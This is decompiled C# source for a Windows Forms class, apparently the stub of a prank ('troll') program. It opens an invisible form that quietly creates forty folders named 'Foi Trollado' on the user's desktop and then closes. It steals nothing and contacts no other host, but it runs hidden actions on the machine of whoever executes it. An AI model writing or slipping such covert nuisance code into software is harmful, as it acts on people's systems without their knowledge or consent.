using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace V34MStub;

public class MakeFile : Form
{
	private string Diretorio = "C:\\Users\\" + Environment.UserName + "\\Desktop";

	private int folder = 0;

	private IContainer components = null;

	private Timer timer1;

	public MakeFile()
	{
		InitializeComponent();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (folder != 40)
		{
			folder++;
			string path = Path.Combine(Diretorio, "Foi Trollado " + folder);
			Directory.CreateDirectory(path);
			Directory.CreateDirectory(path);
			Directory.CreateDirectory(path);
			Directory.CreateDirectory(path);
			Directory.CreateDirectory(path);
			Directory.CreateDirectory(path);
		}
		else
		{
			folder = 0;
			timer1.Stop();
			((Form)this).Close();
		}
	}

	private void MakeFile_Load(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		components = new Container();
		timer1 = new Timer(components);
		((Control)this).SuspendLayout();
		timer1.set_Enabled(true);
		timer1.set_Interval(50);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(120, 0));
		((Control)this).set_Name("MakeFile");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("MakeFile");
		((Form)this).add_Load((EventHandler)MakeFile_Load);
		((Control)this).ResumeLayout(false);
	}
}
